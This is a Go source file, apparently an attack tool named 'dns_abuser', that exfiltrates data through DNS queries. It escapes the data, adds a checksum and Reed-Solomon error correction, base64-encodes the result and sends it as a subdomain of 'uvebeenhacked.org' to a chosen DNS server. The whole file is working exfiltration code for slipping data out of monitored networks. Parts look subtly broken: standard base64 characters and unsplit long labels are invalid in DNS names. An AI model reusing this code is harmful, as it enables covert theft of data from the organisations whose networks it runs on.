package dns_abuser

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"github.com/klauspost/reedsolomon"
	"github.com/miekg/dns"
	"hash/crc32"
	"math"
)

func SendData(d []byte, host string, retry int) error {
	data := mask(d)
	data = appendChecksum(data)
	data, err := appendReedSolomon(data)
	if err != nil {
		return err
	}
	fmt.Println(len(data))

	subdomain := base64.StdEncoding.EncodeToString(data)

	for ret := 0; ret < retry; ret++ {
		err = sendRequest(subdomain, host)
		if err != nil {
			continue
		}
		break
	}
	if err != nil {
		return err
	}

	return nil
}

func mask(d []byte) []byte {
	data := make([]byte, len(d))
	copy(data, d)

	for i := 0; i < len(data); i++ {
		if data[i] == 0xff {
			data = append(data[:i], append([]byte{0xff}, data[i:]...)...)
			i++
		}
	}

	data = append([]byte{0xff}, append(data, 0xff)...)

	return data
}

func appendChecksum(d []byte) []byte {
	data := make([]byte, len(d))
	copy(data, d)

	crc := crc32.ChecksumIEEE(data)
	checksum := make([]byte, 4)
	binary.BigEndian.PutUint32(checksum, crc)

	data = append(data, checksum...)
	return data
}

func appendReedSolomon(d []byte) ([]byte, error) {
	dcp := make([]byte, len(d))
	copy(dcp, d)

	data := make([][]byte, 10)

	chunkSize := int(math.Ceil(float64(len(dcp)) / float64(8)))
	if len(dcp)%chunkSize != 0 {
		dcp = append(dcp, make([]byte, chunkSize-(len(dcp)%chunkSize))...)
	}

	for i := 0; i < 8; i++ {
		data[i] = dcp[i*chunkSize : (i+1)*chunkSize]
	}
	for i := 8; i < 10; i++ {
		data[i] = make([]byte, chunkSize)
	}

	enc, err := reedsolomon.New(8, 2)
	if err != nil {
		return nil, err
	}
	err = enc.Encode(data)
	if err != nil {
		return nil, err
	}

	res := make([]byte, 10*chunkSize)
	for i := 0; i < len(res); i++ {
		chunkIndex := i / chunkSize
		byteIndex := i % chunkSize
		res[i] = data[chunkIndex][byteIndex]
	}

	return res, nil
}

func sendRequest(sub, host string) error {
	domain := fmt.Sprintf("%s.uvebeenhacked.org.", sub)

	// Erstellen einer neuen DNS-Nachricht
	m := new(dns.Msg)
	m.SetQuestion(domain, dns.TypeA) // A-Record-Abfrage

	// DNS-Client konfigurieren und Ziel-DNS-Server festlegen
	client := new(dns.Client)

	// Senden der Anfrage an den festgelegten DNS-Server
	response, _, err := client.Exchange(m, fmt.Sprintf("%s:%d", host, 53))
	if err != nil {
		return err
	}

	// Verarbeiten der Antwort
	for _, ans := range response.Answer {
		if aRecord, ok := ans.(*dns.A); ok {
			fmt.Printf("Antwort: %s -> %s\n", domain, aRecord.A.String())
		}
	}

	return nil
}
